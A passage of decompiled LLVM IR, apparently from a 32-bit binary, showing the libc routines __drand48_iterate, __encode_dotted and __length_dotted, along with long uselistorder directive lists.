304, 305, 306, 235, 236, 237, 238, 239, 240, 241, 242, 307, 308, 309, 310, 311, 312, 313, 314, 243, 25, 244, 245, 246, 247, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 524, 525, 26, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 27, 539, 540, 541, 542, 543, 544, 519, 521, 520, 522, 523, 545, 546, 547, 548, 549, 550, 551, 673, 28, 674, 675, 676, 677, 44, 29, 39, 45, 678, 679, 680, 681, 682, 683, 684, 2, 698, 315, 316, 317, 318, 319, 320, 321, 322, 30, 323, 31, 324, 325, 326, 327, 328, 376, 377, 378, 61, 62, 63, 64, 65, 126, 32, 127, 128, 129, 130, 131, 132, 133, 329, 330, 331, 332, 333, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 744, 745, 746, 160, 161, 354, 355, 806, 807, 808, 809, 338, 339, 747, 748, 66, 67, 68, 218, 219, 220, 268, 269, 830, 831, 832, 749, 750, 720, 721, 722, 456, 457, 810, 811, 812, 844, 845, 846, 432, 433, 434, 162, 122, 123, 386, 387, 361, 362, 450, 451, 452, 751, 700, 833, 834, 835, 836, 599, 600, 601, 701, 702, 632, 633, 636, 637, 813, 814, 818, 819, 820, 829, 685, 686, 687, 690, 691, 692, 695, 696, 697, 752, 34, 792, 33, 797, 798, 799, 688, 689, 693, 694, 638, 639, 640, 641, 642, 643, 644, 645, 647, 652, 626, 627, 628, 629, 630, 631, 648, 649, 35, 650, 651, 646, 753, 772, 773, 715, 716, 717, 36, 718, 719, 634, 635, 741, 742, 754, 755, 756, 363, 364, 365, 366, 367, 368, 369, 370, 821, 822, 823, 340, 341, 342, 343, 124, 125, 774, 775, 776, 777, 778, 134, 135, 136, 137, 52, 53, 54, 55, 379, 380, 381, 382, 334, 335, 336, 337, 344, 345, 346, 347, 793, 794, 795, 796, 824, 825, 826, 827, 828, 815, 816, 817, 779, 780, 781, 789, 790, 791, 782, 783, 787, 788, 784, 37, 785, 786, 757, 758, 38, 759, 40, 760, 761, 706, 712, 713, 707, 708, 709, 710, 711, 703, 704, 705, 371, 372, 373, 374, 375, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 47, 48, 49, 50, 51, 163, 164, 165, 166 }
  uselistorder i32* @ebp, { 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 134, 135, 136, 169, 170, 137, 138, 139, 38, 39, 45, 46, 47, 48, 58, 119, 120, 121, 122, 123, 124, 171, 172, 173, 125, 126, 127, 128, 129, 130, 131, 132, 133, 140, 141, 142, 143, 144, 145, 188, 189, 3, 190, 191, 192, 4, 193, 194, 20, 21, 22, 107, 108, 195, 201, 202, 203, 204, 196, 197, 198, 199, 200, 174, 175, 176, 177, 178, 179, 180, 181, 186, 182, 183, 184, 185, 1, 187, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 49, 50, 51, 56, 52, 53, 54, 55, 57, 5, 146, 147, 148, 149, 150, 40, 0, 41, 42, 43, 44, 70, 71, 72, 73, 74, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 2, 168, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 116, 117, 118, 104, 105, 106, 210, 211, 212, 213, 214, 205, 206, 207, 6, 208, 209, 112, 113, 114, 115, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 109, 110, 111 }
  uselistorder i32 %arg9, { 3, 1, 2, 0 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8067fe9, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8067fc9, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8067faf.outer.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8067f65, { 1, 0 }
  uselistorder label %dec_label_pc_8067f49, { 1, 0 }
  uselistorder label %dec_label_pc_8067faf.backedge, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8067f0c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8067ed3.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8067ef9, { 1, 0 }
  uselistorder label %dec_label_pc_8067ec7, { 1, 0 }
  uselistorder label %dec_label_pc_8067eb0, { 1, 0 }
  uselistorder label %dec_label_pc_8067eb0.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_8067e99, { 1, 0 }
  uselistorder label %dec_label_pc_8067e5e, { 1, 0 }
  uselistorder label %dec_label_pc_8067db5, { 1, 0 }
  uselistorder label %dec_label_pc_8067d45, { 1, 0 }
}

define i32 @__drand48_iterate(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v1_8068003 = add i32 %arg2, 14
  %v2_8068003 = inttoptr i32 %v1_8068003 to i16*
  %v3_8068003 = load i16, i16* %v2_8068003, align 2
  %v4_8068003 = icmp eq i16 %v3_8068003, 0
  %v1_8068008 = icmp eq i1 %v4_8068003, false
  br i1 %v1_8068008, label %dec_label_pc_8068024, label %dec_label_pc_806800a

dec_label_pc_806800a:                             ; preds = %entry
  %v1_806800a = add i32 %arg2, 16
  %v2_806800a = inttoptr i32 %v1_806800a to i32*
  store i32 -554899859, i32* %v2_806800a, align 4
  %v0_8068011 = load i32, i32* %esi.global-to-local, align 4
  %v1_8068011 = add i32 %v0_8068011, 20
  %v2_8068011 = inttoptr i32 %v1_8068011 to i32*
  store i32 5, i32* %v2_8068011, align 4
  %v0_8068018 = load i32, i32* %esi.global-to-local, align 4
  %v1_8068018 = add i32 %v0_8068018, 12
  %v2_8068018 = inttoptr i32 %v1_8068018 to i16*
  store i16 11, i16* %v2_8068018, align 2
  %v0_806801e = load i32, i32* %esi.global-to-local, align 4
  %v1_806801e = add i32 %v0_806801e, 14
  %v2_806801e = inttoptr i32 %v1_806801e to i16*
  store i16 1, i16* %v2_806801e, align 2
  %v0_8068045.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8068024

dec_label_pc_8068024:                             ; preds = %entry, %dec_label_pc_806800a
  %v0_8068065 = phi i32 [ %arg2, %entry ], [ %v0_8068045.pre, %dec_label_pc_806800a ]
  %v4_8068024 = ptrtoint i16* %arg1 to i32
  %v1_806802a = add i32 %v4_8068024, 2
  %v2_806802a = inttoptr i32 %v1_806802a to i16*
  %v3_806802a = load i16, i16* %v2_806802a, align 2
  %v4_806802a = zext i16 %v3_806802a to i32
  store i32 %v4_8068024, i32* %ecx.global-to-local, align 4
  %v2_8068038 = mul nuw i32 %v4_806802a, 65536
  store i32 %v2_8068038, i32* %eax.global-to-local, align 4
  %v1_806803e = add i32 %v4_8068024, 4
  %v2_806803e = inttoptr i32 %v1_806803e to i16*
  %v3_806803e = load i16, i16* %v2_806803e, align 2
  %v4_806803e = zext i16 %v3_806803e to i32
  store i32 %v4_806803e, i32* %eax.global-to-local, align 4
  %v2_8068042 = load i16, i16* %arg1, align 2
  %v3_8068042 = zext i16 %v2_8068042 to i32
  store i32 %v3_8068042, i32* %ecx.global-to-local, align 4
  %v1_8068045 = add i32 %v0_8068065, 16
  %v2_8068045 = inttoptr i32 %v1_8068045 to i32*
  %v3_8068045 = load i32, i32* %v2_8068045, align 4
  store i32 %v3_8068042, i32* %eax.global-to-local, align 4
  store i32 %v2_8068038, i32* %ecx.global-to-local, align 4
  %v4_8068056 = mul i32 %v3_8068045, %v4_806803e
  %v1_8068059 = add i32 %v0_8068065, 20
  %v2_8068059 = inttoptr i32 %v1_8068059 to i32*
  %v3_8068059 = load i32, i32* %v2_8068059, align 4
  %v2_806805c = or i32 %v3_8068042, %v2_8068038
  store i32 %v2_806805c, i32* %ecx.global-to-local, align 4
  %v4_806805e = mul i32 %v3_8068059, %v2_806805c
  store i32 %v2_806805c, i32* %eax.global-to-local, align 4
  %v2_8068063 = add i32 %v4_806805e, %v4_8068056
  %v3_8068065 = load i32, i32* %v2_8068045, align 4
  %v5_8068065 = zext i32 %v3_8068065 to i64
  %v6_8068065 = zext i32 %v2_806805c to i64
  %v7_8068065 = mul nuw i64 %v5_8068065, %v6_8068065
  %v8_8068065 = trunc i64 %v7_8068065 to i32
  %v9_8068065 = udiv i64 %v7_8068065, 4294967296
  %v10_8068065 = trunc i64 %v9_8068065 to i32
  store i32 %v8_8068065, i32* %eax.global-to-local, align 4
  store i32 %v8_8068065, i32* %ecx.global-to-local, align 4
  %v1_806806a = add i32 %v0_8068065, 12
  %v2_806806a = inttoptr i32 %v1_806806a to i16*
  %v3_806806a = load i16, i16* %v2_806806a, align 2
  %v4_806806a = zext i16 %v3_806806a to i32
  %v2_806806e = add i32 %v10_8068065, %v2_8068063
  %v2_8068073 = add i32 %v4_806806a, %v8_8068065
  %v7_8068073 = icmp ult i32 %v2_8068073, %v4_806806a
  store i32 %v2_8068073, i32* %eax.global-to-local, align 4
  store i32 %v4_8068024, i32* %ecx.global-to-local, align 4
  %v3_8068079 = zext i1 %v7_8068073 to i32
  %v5_8068079 = add i32 %v2_806806e, %v3_8068079
  %v1_806807b = trunc i32 %v2_8068073 to i16
  store i16 %v1_806807b, i16* %arg1, align 2
  %v3_806807e = udiv i32 %v2_8068073, 65536
  %v4_806807e = mul i32 %v5_8068079, 65536
  %v5_806807e = or i32 %v4_806807e, %v3_806807e
  store i32 %v5_806807e, i32* %eax.global-to-local, align 4
  %v1_8068085 = trunc i32 %v3_806807e to i16
  %v2_8068085 = load i32, i32* %ecx.global-to-local, align 4
  %v3_8068085 = add i32 %v2_8068085, 2
  %v4_8068085 = inttoptr i32 %v3_8068085 to i16*
  store i16 %v1_8068085, i16* %v4_8068085, align 2
  %v0_8068089 = load i32, i32* %eax.global-to-local, align 4
  %v3_8068089 = udiv i32 %v0_8068089, 65536
  %v1_806808d = trunc i32 %v3_8068089 to i16
  %v2_806808d = load i32, i32* %ecx.global-to-local, align 4
  %v3_806808d = add i32 %v2_806808d, 4
  %v4_806808d = inttoptr i32 %v3_806808d to i16*
  store i16 %v1_806808d, i16* %v4_806808d, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_806806a, { 1, 0 }
  uselistorder i32 %v2_806805c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8068038, { 2, 1, 0 }
  uselistorder i32 %v4_8068024, { 3, 0, 2, 1 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 7, 6, 9, 8, 10, 12, 11, 13 }
  uselistorder i32 4, { 154, 155, 97, 98, 99, 93, 91, 92, 94, 95, 96, 0, 6, 100, 101, 102, 103, 104, 105, 106, 107, 108, 27, 46, 156, 157, 87, 7, 8, 180, 181, 182, 183, 184, 185, 163, 164, 109, 110, 111, 112, 113, 114, 49, 115, 120, 121, 122, 51, 28, 123, 124, 125, 126, 29, 30, 31, 52, 32, 33, 53, 34, 128, 35, 129, 54, 36, 55, 56, 165, 158, 159, 160, 161, 39, 9, 169, 170, 171, 166, 167, 168, 220, 219, 162, 172, 173, 174, 175, 176, 177, 178, 40, 62, 179, 221, 10, 118, 119, 57, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 47, 196, 248, 116, 117, 197, 76, 77, 78, 79, 80, 81, 251, 41, 67, 88, 90, 142, 143, 144, 50, 145, 146, 147, 148, 258, 284, 262, 269, 270, 271, 272, 273, 11, 263, 264, 265, 266, 267, 1, 268, 260, 261, 222, 12, 223, 44, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 26, 244, 245, 45, 246, 13, 285, 283, 89, 130, 131, 42, 132, 133, 134, 135, 2, 14, 3, 127, 43, 4, 288, 15, 136, 198, 16, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 37, 38, 68, 58, 216, 217, 218, 137, 138, 48, 63, 139, 140, 141, 82, 83, 84, 85, 86, 254, 255, 17, 18, 19, 286, 287, 252, 253, 282, 149, 151, 150, 259, 247, 274, 152, 280, 281, 275, 276, 278, 277, 279, 250, 249, 256, 257, 153, 5, 69, 20, 70, 21, 22, 23, 24, 71, 59, 64, 60, 65, 61, 66, 25, 72, 73, 74, 75 }
  uselistorder i32 65536, { 3, 1, 4, 2, 5, 6, 7, 8, 9, 10, 12, 11, 14, 13, 16, 15, 18, 17, 19, 20, 21, 23, 0, 22 }
  uselistorder i16 1, { 2, 3, 1, 0 }
  uselistorder i32 12, { 55, 56, 39, 40, 41, 0, 42, 18, 19, 20, 59, 43, 81, 60, 24, 23, 8, 3, 9, 10, 11, 12, 13, 14, 15, 61, 57, 58, 62, 63, 64, 65, 25, 44, 66, 67, 68, 69, 70, 71, 72, 73, 1, 21, 22, 74, 75, 76, 106, 29, 30, 31, 32, 33, 27, 52, 53, 117, 118, 119, 120, 121, 122, 123, 109, 110, 111, 112, 113, 114, 115, 116, 82, 101, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 26, 100, 45, 46, 47, 48, 135, 49, 77, 5, 6, 78, 79, 16, 17, 80, 7, 50, 51, 34, 35, 36, 37, 38, 134, 107, 131, 54, 105, 108, 2, 103, 104, 102, 124, 125, 126, 136, 127, 128, 129, 130, 132, 4, 133, 28 }
  uselistorder i32 5, { 10, 5, 7, 8, 9, 1, 11, 2, 4, 15, 16, 0, 3, 12, 6, 13, 14 }
  uselistorder i32 20, { 26, 27, 14, 15, 16, 1, 17, 3, 30, 28, 20, 5, 21, 29, 18, 19, 4, 31, 32, 8, 9, 2, 7, 23, 40, 33, 34, 35, 36, 37, 6, 38, 39, 41, 22, 0, 10, 11, 12, 13, 24, 25, 43, 42 }
  uselistorder i32 16, { 87, 88, 42, 41, 0, 43, 44, 89, 11, 97, 12, 22, 23, 13, 90, 45, 98, 99, 91, 52, 53, 54, 55, 56, 57, 64, 58, 59, 60, 61, 62, 63, 65, 66, 67, 68, 69, 70, 71, 73, 74, 75, 92, 93, 94, 95, 96, 14, 127, 46, 47, 48, 49, 100, 101, 102, 103, 104, 105, 106, 107, 131, 15, 30, 31, 32, 33, 34, 35, 36, 37, 16, 27, 24, 40, 28, 85, 139, 128, 5, 10, 129, 2, 1, 130, 4, 3, 76, 77, 21, 17, 6, 72, 18, 149, 78, 79, 80, 81, 82, 83, 50, 51, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 25, 123, 124, 125, 126, 132, 133, 134, 84, 9, 7, 38, 39, 145, 146, 147, 148, 135, 136, 137, 138, 142, 143, 144, 86, 19, 20, 140, 150, 141, 8, 26, 29 }
  uselistorder i16 0, { 13, 0, 6, 14, 3, 15, 11, 16, 4, 7, 5, 8, 1, 9, 2, 10, 12 }
  uselistorder i32 14, { 4, 5, 6, 7, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8068024, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80683e5 = load i32, i32* @edi, align 4
  %v0_80683e6 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_80683ed = ptrtoint i8* %arg1 to i32
  store i32 %v4_80683ed, i32* @edi, align 4
  %v1_806844c4 = icmp eq i8* %arg1, null
  br i1 %v1_806844c4, label %dec_label_pc_8068455, label %dec_label_pc_8068450.lr.ph

dec_label_pc_8068450.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8068450

dec_label_pc_80683f3:                             ; preds = %dec_label_pc_8068450
  %v5_80683f8 = call i32 @__GI_strchr(i8* %v1_8068450, i32 46)
  %v1_8068400 = icmp eq i32 %v5_80683f8, 0
  br i1 %v1_8068400, label %dec_label_pc_806840c, label %dec_label_pc_8068406

dec_label_pc_8068406:                             ; preds = %dec_label_pc_80683f3
  %v1_8068408 = load i32, i32* @edi, align 4
  %v2_8068408 = sub i32 %v5_80683f8, %v1_8068408
  br label %dec_label_pc_806841a

dec_label_pc_806840c:                             ; preds = %dec_label_pc_80683f3
  %v0_806840f = load i32, i32* @edi, align 4
  %v5_806840f = inttoptr i32 %v0_806840f to i8*
  %v3_8068410 = call i32 @strlen(i8* %v5_806840f)
  br label %dec_label_pc_806841a

dec_label_pc_806841a:                             ; preds = %dec_label_pc_8068406, %dec_label_pc_806840c
  %v0_806842d = phi i32 [ %v2_8068408, %dec_label_pc_8068406 ], [ %v3_8068410, %dec_label_pc_806840c ]
  store i32 %v0_806842d, i32* @esi, align 4
  %v1_806841a = icmp eq i32 %v0_806842d, 0
  %v3_806841a = trunc i32 %v0_806842d to i8
  br i1 %v1_806841a, label %dec_label_pc_8068469, label %dec_label_pc_806841e

dec_label_pc_806841e:                             ; preds = %dec_label_pc_806841a
  %v1_8068422 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8068422 = sub i32 %arg3, %v1_8068422
  %v1_8068424 = add i32 %v2_8068422, -1
  %v7_8068425 = icmp ult i32 %v0_806842d, %v1_8068424
  %v1_8068427 = icmp eq i1 %v7_8068425, false
  br i1 %v1_8068427, label %dec_label_pc_8068469, label %dec_label_pc_8068429

dec_label_pc_8068429:                             ; preds = %dec_label_pc_806841e
  store i32 %arg2, i32* @edx, align 4
  %v4_806842f = add i32 %v1_8068422, %arg2
  %v5_806842f = inttoptr i32 %v4_806842f to i8*
  store i8 %v3_806841a, i8* %v5_806842f, align 1
  %v0_8068432 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8068432 = add i32 %v0_8068432, 1
  %v0_8068434 = load i32, i32* @edx, align 4
  %v0_8068436 = load i32, i32* @esi, align 4
  %v2_8068437 = add i32 %v1_8068432, %v0_8068434
  %v0_8068439 = load i32, i32* @edi, align 4
  %v2_806843a = add i32 %v0_8068436, %v1_8068432
  store i32 %v2_806843a, i32* %ebx.global-to-local, align 4
  %tmp29 = inttoptr i32 %v2_8068437 to i16*
  %v7_806843d = call i32 @memcpy(i16* %tmp29, i32 %v0_8068439, i32 %v0_8068436)
  %v1_8068449 = add i32 %v5_80683f8, 1
  br i1 %v1_8068400, label %dec_label_pc_8068455, label %dec_label_pc_806844c

dec_label_pc_806844c:                             ; preds = %dec_label_pc_8068429
  store i32 %v1_8068449, i32* @edi, align 4
  %v1_806844c = icmp eq i32 %v1_8068449, 0
  br i1 %v1_806844c, label %dec_label_pc_8068455, label %dec_label_pc_8068450

dec_label_pc_8068450:                             ; preds = %dec_label_pc_8068450.lr.ph, %dec_label_pc_806844c
  %v0_80683f7 = phi i32 [ %v4_80683ed, %dec_label_pc_8068450.lr.ph ], [ %v1_8068449, %dec_label_pc_806844c ]
  %v1_8068450 = inttoptr i32 %v0_80683f7 to i8*
  %v2_8068450 = load i8, i8* %v1_8068450, align 1
  %v3_8068450 = icmp eq i8 %v2_8068450, 0
  %v1_8068453 = icmp eq i1 %v3_8068450, false
  br i1 %v1_8068453, label %dec_label_pc_80683f3, label %dec_label_pc_8068455

dec_label_pc_8068455:                             ; preds = %dec_label_pc_806844c, %dec_label_pc_8068450, %dec_label_pc_8068429, %entry
  %tmp30 = icmp slt i32 %arg3, 1
  br i1 %tmp30, label %dec_label_pc_8068469, label %dec_label_pc_806845c

dec_label_pc_806845c:                             ; preds = %dec_label_pc_8068455
  %v1_8068460 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8068460 = add i32 %v1_8068460, %arg2
  %v3_8068460 = inttoptr i32 %v2_8068460 to i8*
  store i8 0, i8* %v3_8068460, align 1
  %v0_8068464 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8068464 = add i32 %v0_8068464, 1
  br label %dec_label_pc_806846c

dec_label_pc_8068469:                             ; preds = %dec_label_pc_806841e, %dec_label_pc_806841a, %dec_label_pc_8068455
  br label %dec_label_pc_806846c

dec_label_pc_806846c:                             ; preds = %dec_label_pc_806845c, %dec_label_pc_8068469
  %storemerge2 = phi i32 [ %v1_8068464, %dec_label_pc_806845c ], [ -1, %dec_label_pc_8068469 ]
  store i32 %v0_80683e6, i32* @esi, align 4
  store i32 %v0_80683e5, i32* @edi, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %v1_8068450, { 1, 0 }
  uselistorder i32 %v1_8068449, { 0, 2, 1 }
  uselistorder i32 %v0_8068436, { 1, 0 }
  uselistorder i32 %v5_80683f8, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 1, 11, 12, 8, 9, 3, 4, 2, 10, 18, 13, 14, 0, 7, 5, 6, 23, 15, 16, 17, 19, 20, 21, 22 }
  uselistorder i32* @edx, { 22, 23, 3, 27, 25, 26, 2, 28, 29, 30, 34, 35, 36, 37, 83, 84, 85, 86, 87, 88, 89, 90, 52, 38, 39, 40, 53, 54, 71, 72, 4, 31, 32, 33, 137, 136, 91, 92, 41, 42, 5, 43, 44, 45, 47, 93, 94, 95, 96, 46, 97, 98, 99, 149, 150, 151, 152, 6, 153, 154, 55, 56, 19, 135, 0, 160, 163, 7, 164, 161, 8, 162, 159, 138, 9, 139, 175, 73, 74, 76, 77, 78, 79, 10, 57, 58, 59, 60, 61, 62, 63, 70, 64, 65, 66, 67, 68, 69, 24, 75, 100, 101, 80, 81, 11, 82, 48, 49, 50, 51, 102, 103, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 16, 121, 122, 104, 123, 12, 124, 125, 127, 13, 128, 129, 130, 131, 132, 133, 14, 126, 155, 134, 1, 20, 21, 165, 176, 17, 177, 178, 179, 183, 180, 181, 156, 157, 141, 142, 144, 145, 148, 140, 146, 147, 143, 166, 169, 170, 18, 174, 182, 171, 173, 15, 172, 167, 158, 168, 184, 185 }
  uselistorder i32 (i8*)* @strlen, { 5, 4, 0, 3, 2, 1 }
  uselistorder i32 46, { 1, 2, 0 }
  uselistorder i8* null, { 4, 3, 6, 5, 7, 9, 0, 1, 8, 10, 11, 2 }
  uselistorder i32* @esi, { 99, 100, 47, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 117, 118, 119, 120, 121, 122, 123, 242, 243, 13, 244, 325, 219, 220, 229, 230, 231, 14, 232, 233, 124, 125, 234, 15, 235, 236, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 16, 255, 256, 126, 17, 127, 128, 134, 133, 10, 135, 140, 141, 142, 143, 144, 145, 146, 0, 48, 147, 148, 11, 149, 150, 151, 165, 113, 114, 115, 116, 222, 223, 224, 221, 326, 327, 328, 331, 329, 330, 225, 226, 227, 228, 237, 238, 239, 240, 241, 84, 85, 86, 87, 88, 369, 370, 371, 372, 166, 167, 257, 258, 259, 260, 18, 261, 262, 263, 264, 265, 266, 267, 373, 374, 375, 376, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 1, 64, 65, 89, 90, 91, 92, 93, 94, 95, 377, 389, 390, 208, 209, 2, 210, 211, 401, 414, 19, 415, 416, 409, 410, 411, 412, 413, 405, 406, 407, 408, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 20, 343, 49, 344, 345, 346, 347, 168, 169, 172, 173, 174, 175, 152, 21, 153, 154, 157, 155, 156, 164, 158, 159, 160, 161, 162, 163, 464, 22, 465, 466, 129, 130, 131, 132, 268, 23, 269, 50, 43, 170, 171, 176, 177, 467, 468, 270, 271, 272, 273, 274, 275, 276, 178, 179, 180, 181, 136, 24, 12, 182, 183, 184, 185, 186, 25, 44, 187, 188, 189, 190, 137, 26, 138, 139, 277, 278, 279, 280, 28, 281, 3, 283, 284, 285, 286, 27, 287, 288, 282, 289, 290, 291, 292, 4, 293, 294, 295, 296, 297, 298, 299, 45, 29, 300, 301, 30, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 31, 319, 320, 321, 302, 5, 303, 304, 322, 32, 33, 323, 324, 378, 379, 387, 388, 191, 192, 193, 194, 195, 34, 196, 197, 198, 199, 215, 216, 217, 218, 52, 53, 80, 81, 35, 82, 83, 200, 201, 202, 203, 36, 37, 204, 205, 66, 67, 38, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 96, 97, 98, 441, 442, 206, 207, 391, 392, 393, 348, 354, 355, 365, 6, 366, 367, 368, 443, 444, 448, 449, 450, 451, 462, 463, 380, 381, 382, 383, 384, 385, 386, 356, 357, 358, 359, 363, 364, 352, 349, 350, 351, 46, 353, 360, 361, 362, 402, 403, 39, 404, 417, 418, 419, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 445, 41, 40, 446, 447, 429, 430, 431, 42, 439, 440, 432, 433, 434, 435, 436, 437, 438, 420, 421, 422, 423, 7, 9, 8, 424, 425, 397, 398, 399, 400, 394, 395, 396, 212, 213, 214, 426, 427, 428, 51 }
  uselistorder i32* @edi, {}
  uselistorder label %dec_label_pc_806846c, { 1, 0 }
  uselistorder label %dec_label_pc_8068469, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8068455, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8068450, { 1, 0 }
  uselistorder label %dec_label_pc_806841a, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8068482 = icmp eq i32 %arg1, 0
  br i1 %v1_8068482, label %dec_label_pc_80684b1, label %dec_label_pc_80684a2.preheader

dec_label_pc_80684a2.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_80684a210 = add i32 %arg2, %arg1
  %v3_80684a211 = inttoptr i32 %v2_80684a210 to i8*
  %v4_80684a212 = load i8, i8* %v3_80684a211, align 1
  %v1_80684a614 = add i32 %arg2, 1
  %v1_80684a915 = icmp eq i8 %v4_80684a212, 0
  %v1_80684ab16 = icmp eq i1 %v1_80684a915, false
  br i1 %v1_80684ab16, label %dec_label_pc_8068491, label %dec_label_pc_80684ad

dec_label_pc_8068488:                             ; preds = %dec_label_pc_8068491
  %v1_8068488 = add i32 %v0_806848817, 2
  br label %dec_label_pc_80684ad

dec_label_pc_8068491:                             ; preds = %dec_label_pc_80684a2.preheader, %dec_label_pc_80684a2
  %v1_80684a619 = phi i32 [ %v1_80684a6, %dec_label_pc_80684a2 ], [ %v1_80684a614, %dec_label_pc_80684a2.preheader ]
  %v5_80684a218.in = phi i8 [ %v4_80684a2, %dec_label_pc_80684a2 ], [ %v4_80684a212, %dec_label_pc_80684a2.preheader ]
  %v0_806848817 = phi i32 [ %v2_806849f, %dec_label_pc_80684a2 ], [ %arg2, %dec_label_pc_80684a2.preheader ]
  %v5_80684a218 = zext i8 %v5_80684a218.in to i32
  %v1_8068493 = and i32 %v5_80684a218, 192
  %v6_8068498 = icmp eq i32 %v1_8068493, 192
  %v2_806849f = add i32 %v5_80684a218, %v1_80684a619
  br i1 %v6_8068498, label %dec_label_pc_8068488, label %dec_label_pc_80684a2

dec_label_pc_80684a2:                             ; preds = %dec_label_pc_8068491
  store i32 %v2_806849f, i32* @ecx, align 4
  %v2_80684a2 = add i32 %v2_806849f, %arg1
  %v3_80684a2 = inttoptr i32 %v2_80684a2 to i8*
  %v4_80684a2 = load i8, i8* %v3_80684a2, align 1
  %v1_80684a6 = add i32 %v2_806849f, 1
  %v1_80684a9 = icmp eq i8 %v4_80684a2, 0
  %v1_80684ab = icmp eq i1 %v1_80684a9, false
  br i1 %v1_80684ab, label %dec_label_pc_8068491, label %dec_label_pc_80684ad

dec_label_pc_80684ad:                             ; preds = %dec_label_pc_80684a2.preheader, %dec_label_pc_80684a2, %dec_label_pc_8068488
  %v0_80684ad = phi i32 [ %v1_8068488, %dec_label_pc_8068488 ], [ %v1_80684a614, %dec_label_pc_80684a2.preheader ], [ %v1_80684a6, %dec_label_pc_80684a2 ]
  %v2_80684af = sub i32 %v0_80684ad, %arg2
  br label %dec_label_pc_80684b1

dec_label_pc_80684b1:                             ; preds = %entry, %dec_label_pc_80684ad
  %v0_80684b4 = phi i32 [ -1, %entry ], [ %v2_80684af, %dec_label_pc_80684ad ]
  ret i32 %v0_80684b4

; uselistorder directives
  uselistorder i8 %v4_80684a2, { 1, 0 }
  uselistorder i32 %v2_806849f, { 2, 3, 1, 0 }
